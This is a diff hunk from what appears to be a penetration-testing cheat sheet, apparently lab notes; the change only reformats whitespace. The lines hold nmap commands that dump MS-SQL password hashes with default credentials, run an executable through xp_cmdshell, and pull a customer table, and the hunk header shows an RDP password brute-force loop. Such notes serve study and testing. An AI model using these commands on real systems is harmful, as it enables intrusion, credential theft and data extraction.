@@ -185,9 +185,9 @@ for username in $(cat USER_LIST); do for password in $(cat PASS_LIST) do; rdeskt
 ```bash
 nmap -vv -sV -Pn -p 27900 --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=27900,mssql.username=sa,mssql.password=sa $TARGET
 
- nmap -n -v -p 1433 10.11.1.31 -sTV -PN --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd="c:\ralph.exe"
+nmap -n -v -p 1433 10.11.1.31 -sTV -PN --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd="c:\ralph.exe"
 
- nmap -n -v -p 27900 10.11.1.227 -sV --script ms-sql-query.nse --script-args mssql.username=sa,mssql.password=password,ms-sql-query.query="SELECT * FROM tblCustomers",mssql.database=tblCustomers
+nmap -n -v -p 27900 10.11.1.227 -sV --script ms-sql-query.nse --script-args mssql.username=sa,mssql.password=password,ms-sql-query.query="SELECT * FROM tblCustomers",mssql.database=tblCustomers
 
 ```
 
